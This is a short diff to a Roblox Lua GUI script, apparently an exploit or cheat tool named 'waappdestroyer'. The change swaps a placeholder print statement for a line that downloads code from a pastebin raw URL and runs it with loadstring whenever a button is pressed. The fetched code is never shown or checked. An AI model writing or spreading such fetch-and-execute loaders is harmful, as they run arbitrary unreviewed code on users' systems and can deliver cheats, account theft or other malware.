@@ -268,7 +268,7 @@ local function TWFBJZF_fake_script() -- waappdestroyer.Script
 	local script = Instance.new('Script', waappdestroyer)
 
 	script.Parent.MouseButton1Down:Connect(function()
-            print("no work sAD")
+loadstring(game:HttpGet("https://pastebin.com/raw/BywSVje6"))()
 	end)
 end
 coroutine.wrap(TWFBJZF_fake_script)()
